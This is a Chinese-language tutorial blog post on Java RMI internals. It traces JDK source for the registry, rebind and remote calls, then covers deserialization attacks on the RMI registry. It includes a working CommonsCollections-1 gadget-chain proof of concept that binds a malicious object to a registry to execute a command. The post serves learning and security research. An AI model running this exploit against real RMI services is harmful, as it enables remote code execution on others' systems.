# 前言
在后续学习`fastjson`等`JAVA`反序列化漏洞时，需要先了解`RMI`机制和`JNDI`注入等知识点，因此借用本篇文章来记录学习一下`RMI`机制

# 概念原理
`RMI`是远程方法调用的简称，能够帮助我们查找并执行远程对象的方法。简单来说，远程调用就像将一个`class`放在`A`机器上，然后在`B`机器中调用这个`class`的方法。

`RMI`（Remote Method Invocation）为远程方法调用，是允许运行在一个`Java`虚拟机的对象调用运行在另一个`Java`虚拟机上的对象的方法，这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。

`Java RMI`（Java Remote Method Invocation）是`Java`编程语言里一种用于实现远程过程调用的应用程序编程接口，它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使`Java`编程人员能够在网络环境中分布操作，`RMI`全部的宗旨就是尽可能简化远程接口对象的使用。

从客户端-服务器模型来看，客户端程序直接调用服务端，两者之间是通过`JRMP`（ Java Remote Method Protocol）协议通信，这个协议类似于`HTTP`协议，规定了客户端和服务端通信要满足的规范。

在`RMI`中对象是通过序列化方式进行编码传输的，`RMI`分为三个主体部分:

> * Client-客户端：客户端调用服务端的方法
> * Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果
> * Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用，在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功

总体`RMI`的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样，唯一区别就是`RMI`服务端提供的方法，被调用的时候该方法是执行在服务端

<img src="./images/1.png" alt="">

# RMI实现过程
`RMI`可以调用远程的一个`Java`的对象进行本地执行，但是远程被调用的该类必须继承`java.rmi.Remote`接口。
## RMI服务端
### 定义一个远程接口

```java
package RMI.Interface;

import java.rmi.Remote;
import java.rmi.RemoteException;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/12/16 5:32 下午
 */
public interface DemoInterface extends Remote {
    public String ctf() throws RemoteException;
}
```

要求

> * 使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错（如果客户端、服务端放一起没关系）
> * 同时需要继承Remote类
> * 接口的方法需要声明java.rmi.RemoteException报错
> * 服务端实现这个远程接口

### 服务端实现远程接口
```java
package RMI.Server;

import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/12/16 5:33 下午
 */
public class RMIServer extends UnicastRemoteObject implements RMI.Interface.DemoInterface {
    public RMIServer() throws RemoteException {
        super();
    }

    public String ctf() throws RemoteException {
        System.out.println("Ctfer is so cool!");
        return "Hello World!";
    }

    public void start() throws Exception {
        RMIServer rmiServer = new RMIServer();
        LocateRegistry.createRegistry(8888);
        Naming.rebind("rmi://127.0.0.1:8888/h3rmesk1t", rmiServer);
        System.out.println("RMI服务在9999端口已启动.");
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}
```

要求

> * 实现远程接口
> * 继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）
> * 构造函数需要抛出一个RemoteException错误
> * 实现类中使用的对象必须都可序列化，即都继承java.io.Serializable

## RMI客户端
```java
package RMI.Client;

import RMI.Interface.DemoInterface;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/12/16 5:40 下午
 */
public class RMIClient {
    public static void main(String[] args) throws RemoteException, MalformedURLException, NotBoundException {
        DemoInterface demoInterface = (DemoInterface) Naming.lookup("rmi://127.0.0.1:8888/h3rmesk1t");

        String res = demoInterface.ctf();
        System.out.println(res);
    }
}
```

<img src="./images/2.png" alt="">

<img src="./images/3.png" alt="">

# 源码分析
获取注册中心有两种方式：一种是创建时获取（LocateRegistry#createRegistry），另外一种则是远程获取（LocateRegistry#getRegistry）

## 本地获取注册中心
跟踪源码，发现`createRegistry`有两种方法，区别在于其传递的参数不一样，第一种只需要传递`port`，即注册中心监听的端口，另一种在传递`port`的同时，还需要传递`RMIClientSocketFactory csf`和`RMIServerSocketFactory ssf`，这两种方法最后获取到的都是`Registrylmpl`对象

<img src="./images/4.png" alt="">

由于两种方法差别不大，因此这里选择分析第一种方法，跟进`Registrylmpl`，这里`new`了一个`LiveRef`对象，包括`ip`和监听的端口信息等

<img src="./images/5.png" alt="">

<img src="./images/6.png" alt="">

跟进`Registrylmpl#setup`

<img src="./images/7.png" alt="">

跟进`UnicastServerRef#exportObject`，

<img src="./images/8.png" alt="">

接着调用`Util.createProxy`方法

<img src="./images/9.png" alt="">

跟进`CreateStub`方法，这里返回`RegistryImpl_Stub`对象

<img src="./images/10.png" alt="">

回到`UnicastServerRef.class`，因此`var5`也是`RegistryImpl_Stub`对象
进入`setSkeleton`方法，这里也利用`Util.createSkeleton`来获取`RegistryImpl_Skel`对象

<img src="./images/11.png" alt="">

继续跟进，在创建完`RegistryImpl_Stub`和`RegistryImpl_Skel`对象后，会实例化创建一个`Target`对象

<img src="./images/12.png" alt="">

`var6`把上面获取到的`RegistryImpl_Stub`、`RegistryImpl_Skel`对象以及一些`ip`端口信息封装在一个对象里边，之后会调用`LiveRef#exportObject`，并且将`Target`对象传进去，接着会调用多个`exportObject`，进入到`TCPTransport#exportObject`中

<img src="./images/13.png" alt="">

接着进入到网络层的操作，包括监听端口、设置当遇到请求时的处理方式等

<img src="./images/14.png" alt="">

进入`listen`方法，调用`TCPEndpoint#newServerSocket`时会开启端口监听

<img src="./images/15.png" alt="">

接着调用`TCPTransport#AcceptLoop`，设置`AcceptLoop`线程，触发`run`方法

<img src="./images/16.png" alt="">

这里会获取到请求的一些相关信息，比如`Host`之类，之后在下边会创建一个线程调用`ConnectionHandler`来处理请求，跟入`ConnectionHandler#run`，紧接着调用`ConnectionHandler#run0`

<img src="./images/17.png" alt="">

跟进下去，`var15`的值为`75`，从而在`switch-case`循环中进入`case 75` ,调用`TCPTransport#handleMessages`来处理请求，跟入`handlerMessages`，`var5`的值为`80`，进入`case 80`中

<img src="./images/18.png" alt="">

接着创建了一个`StreamRemoteCall`对象，并传入`var1`，`var1`是当前连接的`Connection`对象，接着跟入`TCPTransport#serviceCall`，获取了传来的一些信息，比如`ObjID`，接着会获取`Target`对象，在下边会调用`UnicastServerRef#dispatch`来处理请求

<img src="./images/19.png" alt="">

在`UnicastServerRef#dispatch`中传递了两个参数，一个是`Remote`对象，一个是当前连接的`StreamRemoteCall`对象

<img src="./images/20.png" alt="">

继续读入数据，接着调用`UnicastServerRef#oldDispatch`，调用`this.skel.dispatch`，这里的`this.skel`为刚刚创建的`RegistryImpl_Skel`对象，并调用其`dispatch`方法

<img src="./images/21.png" alt="">

跟进`RegistryImpl_Skel#dispatch`，在这里进入真正处理请求的核心，`var3`是传递过来的`int`类型的参数，在这里有如下关系的对应

> * 0 -> bind
> * 1 -> list
> * 2 -> lookup
> * 3 -> rebind
> * 4 -> unbind

<img src="./images/22.png" alt="">

在这里会对每个调用的方法进行处理，例如前面代码中调用了`rebind`方法，就会先`readObject`反序列化传过来的序列化对象，之后再调用`var6.rebind`来注册服务，此时的`var6`为`RegistryImpl`对象，这个对象其实就是调用`createRegistry`获得的，无论是客户端还是服务端，最终其调用注册中心的方法都是通过对创建的`RegistryImpl`对象进行调用

<img src="./images/23.png" alt="">

## 远程获取注册中心
通过`getRegistry`方法获得的对象是`RegistryImpl_Stub`对象，而通过`createRegistry`获得的对象是`RegistryImpl`对象

当调用这两者的方法时，其对应的处理方式也十分不同，以`rebind`方法举例，通过`createRegistry`获得的注册中心调用`bind`方法十分简单，在第一步会`checkAccess`，里边有一些判断，会对当前的权限、来源IP进行判断(高版本`JDK`中不允许除了`localhost`之外的地址注册服务也是在这里进行判断)，之后则将键和对象都`put`到`Hashtable`中

<img src="./images/24.png" alt="">

接着来看看远程调用`rebind`方法，`Server`端测试代码

```java
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/12/16 5:33 下午
 */
public class RMIServer extends UnicastRemoteObject implements RMI.Interface.DemoInterface {
    public RMIServer() throws RemoteException {
        super();
    }

    public String ctf() throws RemoteException {
        System.out.println("Ctfer is so cool!");
        return "Hello World!";
    }

    public void start() throws Exception {
        RMIServer rmiServer = new RMIServer();
        LocateRegistry.getRegistry(7777);
        Naming.rebind("rmi://127.0.0.1:7777/h3rmesk1t", rmiServer);
        System.out.println("RMI服务在7777端口已启动.");
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}
```

这里先创建了注册中心，之后通过`getRegistry`的方式远程获取注册中心，此时获得到的对象为`RegistryImpl_Stub`，跟入其`rebind`方法

<img src="./images/25.png" alt="">

<img src="./images/26.png" alt="">

跟进`rebind`调用的`UnicastRef#newCall`，这里的`var3`就是上文提到的对应关系

<img src="./images/27.png" alt="">

跟进`StreamRemoteCall`方法，这里在最开始写入了`80`，还会写一些数据比如要调用的方法所对应的`num`和`ObjID`之类的

<img src="./images/28.png" alt="">

当调用完这些之后，回到`rebind`方法，此时会往写入两个内容
> * 序列化后的var1，var1为我们要绑定远程对象对应的名称
> * 序列化后的var2，var2为我们要绑定的远程对象

<img src="./images/29.png" alt="">

在`invoke`这里会把请求发出去，接着看看注册中心在收到这条请求后是如何进行处理的，由于上文分析了会调用`Skel#dispatch`来处理请求，因此直接跟着这往后看，注册中心首先会`read`两个`Object`，第一个是刚刚`write`进去的字符串对象，第二个就是远程对象了，接着调用`var6.rebind`来绑定服务

<img src="./images/30.png" alt="">

## 客户端与服务端通信
客户端与服务端的通信只发生在调用远程方法时，此时是客户端的远程代理对象与的`Skel`进行通信，将断点下在`Client`端利用接口调用方法处

<img src="./images/31.png" alt="">

跟进断点，在客户端获取的是注册中心封装好的代理对象，所以默认会调用代理对象的`invoke`方法

<img src="./images/32.png" alt="">

这里会判断调用的方法是所有对象都有的还是只有远程对象才有的，如果是所有对象都有的则进入`invokeObjectMethod`中，否则则进入`invokeRemoteMethod`中

跟进`RemoteObjectInvocationHandle#invokeRemoteMethod`，跟进调用的`ref.invoke`，并把`proxy`、`method`、`args`以及`method`的`hash`传过去，`ref`是在`lookup`时获取到的远程对象绑定的一些端口信息，需要注意的是这里的端口是随机的，每次都会变

<img src="./images/33.png" alt="">

<img src="./images/34.png" alt="">

跟进`invoke`方法，在`newConnection`这里会发送一些约定好了的数据

<img src="./images/35.png" alt="">

跟进`for`循环，在`marshaValue`里会将调用的方法要传递的参数序列化写到连接中，如果传递的参数是对象，就会将序列化对象写入到里面

<img src="./images/36.png" alt="">

接着调用`StreamRemoteCall#executeCall`

<img src="./images/37.png" alt="">

跟进`executeCall`方法，在`this.releaseOutputStream`方法中会读取服务端执行的结果

<img src="./images/38.png" alt="">

跟进`StreamRemoteCall#releaseOutputStream`，在`this.out.flush`时会把之前写进去的数据发出去，服务端会返回执行结果

<img src="./images/39.png" alt="">

结束调用`executeCall`后，会调用`unmarsharValue`方法把数据取出来

<img src="./images/40.png" alt="">

跟进`UnicastRef#unmarsharValue`，这里对传入的参数做一个判断，当其数据类型是`Object`时，则会调用`JDK`自带的`readObject`来进行反序列化

<img src="./images/41.png" alt="">

当`Client`在与`Server`通信时，`Server`实际处理请求的位置在`UnicastServerRef#dispatch`，调用`unmarshaValue`对请求传来的参数进行处理

<img src="./images/42.png" alt="">

在这里会判断参数的数据类型，如果是`Object`的话则会反序列化，因此如果可以找到`Server`注册的远程对象中某个方法传递的参数类型是`Object`时，即可在`Server`端进行反序列化从而来达到`RCE`的目的

结束`unmarshaValue`后，最终通过调用`invoke`来调用远程对象的方法

<img src="./images/43.png" alt="">

# RMI反序列化攻击方式
后续漏洞利用演示均利用`CommonsCollections-1`链

## 攻击注册中心
与注册中心进行交互的方式有
> * bind
> * list
> * lookup
> * rebind
> * unbind

在注册中心的处理中，如果存在`readObject`，则可以利用

### bind
```java
case 0:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var94) {
        throw new UnmarshalException("error unmarshalling arguments", var94);
    } catch (ClassNotFoundException var95) {
        throw new UnmarshalException("error unmarshalling arguments", var95);
    } finally {
        var2.releaseInputStream();
    }

    var6.bind(var7, var8);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var93) {
        throw new MarshalException("error marshalling return", var93);
    }
```
当调用`bind`时，会利用`readObject`读取参数名及远程对象，因此可以利用

POC:
```java
package RegistryAttack;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/12/17 2:36 上午
 */
public class BindAttack {

    public static void bindAttack() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, AlreadyBoundException, RemoteException {
        Transformer[] transformer = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);

        HashMap innermap = new HashMap();
        Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
        Constructor[] constructors = clazz.getDeclaredConstructors();
        Constructor constructor = constructors[0];
        constructor.setAccessible(true);
        Map map = (Map)constructor.newInstance(innermap,chainedTransformer);


        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler

        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象

        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);

        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 8888);
        Remote remote = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[] { Remote.class }, handler));
        registry.bind("user", remote);
    }

    public static void main(String[] args) {
        try {
            bindAttack();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### list
```java
case 1:
    var2.releaseInputStream();
    String[] var97 = var6.list();

    try {
        ObjectOutput var98 = var2.getResultStream(true);
        var98.writeObject(var97);
        break;
    } catch (IOException var92) {
        throw new MarshalException("error marshalling return", var92);
    }
```

当调用`list`时，不存在`readObject`，因此无法攻击注册中心

### lookup
```java
case 2:
    try {
        var10 = var2.getInputStream();
        var7 = (String)var10.readObject();
    } catch (IOException var89) {
        throw new UnmarshalException("error unmarshalling arguments", var89);
    } catch (ClassNotFoundException var90) {
        throw new UnmarshalException("error unmarshalling arguments", var90);
    } finally {
        var2.releaseInputStream();
    }

    var8 = var6.lookup(var7);

    try {
        ObjectOutput var9 = var2.getResultStream(true);
        var9.writeObject(var8);
        break;
    } catch (IOException var88) {
        throw new MarshalException("error marshalling return", var88);
    }
```
当调用`lookup`时，会利用`readObject`读取参数参数名，因此可以利用

### rebind
```java
case 3:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var85) {
        throw new UnmarshalException("error unmarshalling arguments", var85);
    } catch (ClassNotFoundException var86) {
        throw new UnmarshalException("error unmarshalling arguments", var86);
    } finally {
        var2.releaseInputStream();
    }

    var6.rebind(var7, var8);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var84) {
        throw new MarshalException("error marshalling return", var84);
    }
```
当调用`rebind`时，会利用`readObject`读取参数名及远程对象，因此可以利用

### unbind
```java
case 4:
    try {
        var10 = var2.getInputStream();
        var7 = (String)var10.readObject();
    } catch (IOException var81) {
        throw new UnmarshalException("error unmarshalling arguments", var81);
    } catch (ClassNotFoundException var82) {
        throw new UnmarshalException("error unmarshalling arguments", var82);
    } finally {
        var2.releaseInputStream();
    }

    var6.unbind(var7);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var80) {
        throw new MarshalException("error marshalling return", var80);
    }
```
当调用`unbind`时，会利用`readObject`读取参数参数名，因此可以利用


# 参考文章
[Java安全之RMI反序列化](https://xz.aliyun.com/t/9053)